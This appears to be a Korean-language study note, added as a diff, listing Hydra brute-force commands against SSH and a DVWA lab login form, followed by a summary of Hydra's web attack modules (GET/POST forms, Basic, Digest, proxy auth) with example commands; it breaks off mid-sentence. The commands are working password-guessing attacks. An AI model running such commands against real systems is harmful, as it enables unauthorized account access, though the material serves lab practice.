@@ -1,0 +1,56 @@
+1. ftp = hydra -l testuser -P passwd.txt ssh://172.16.29.11
+2. ssh = hydra -l testuser -P passwd.txt ssh://172.16.29.11
+3. DVWA = 
+hydra -l [id] -P [패스워드 파일 경로] [ip] -s [포트 설정] http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=[쿠키값]; security=[난이도]:F=Username and/or password incorrect."
+>>
+hydra -l admin -P /home/zizon/passwd.txt dv.ul.com -s 80 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=888d558fcad939763200bfcd0f78f31b;security=low:F=Username and/or password incorrect."
+
+
+------------------------------------------------
+
+
+Hydra에서 사용할 수 있는 웹 기반 공격 방식 총정리
+1. http-get-form
+GET 방식의 웹 로그인 폼 공격
+URL 뒤에 파라미터가 붙는 형태
+예:
+/login.php?user=admin&pass=1234
+DVWA Low Level이 이 방식임.
+
+2️. http-post-form
+POST 방식 로그인 폼 공격
+대부분의 실제 웹사이트가 POST 기반 로그인
+요청 본문(body)에 파라미터가 들어감
+예:
+hydra -L users.txt -P pass.txt 10.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
+DVWA Medium/High Level에서 CSRF 없는 POST 폼일 때 사용 가능.
+
+3️. http-form-post
+http-post-form과 매우 비슷하지만 더 다양한 옵션 제공
+multipart/form-data, 쿠키, 헤더 등을 지원
+웹사이트가 복잡할 때 이걸 씀
+예시:
+http-form-post "/login:username=^USER^&password=^PASS^:incorrect"
+
+4️. http-head
+서버의 응답 코드(401 등)를 기반으로 인증 시도
+HTTP Basic Auth 또는 Digest Auth 등에서 사용됨
+폼 기반이 아니라 서버 인증 자체를 크래킹할 때 유용
+예시:
+hydra -L users -P passwords http-head://10.0.0.1/
+ 폼 기반이 아닌 HTTP 인증 모듈
+
+5️. http-basic
+HTTP Basic Authentication 공격
+주소에 user/pass 입력하는 기본 인증창 공격
+예:
+hydra -L users.txt -P pass.txt -s 80 10.0.0.1 http-basic /admin
+
+6️. http-digest
+Digest Authentication 공격
+일반 Basic보다 보안 강화된 웹 서버 인증
+
+7️. http-proxy / http-proxy-urlenum
+프록시 서버 인증 공격
+기업 내부망에서 자주 사용
+NetWork탭 로그인 시도 하면 밑에 처럼 되고 Method
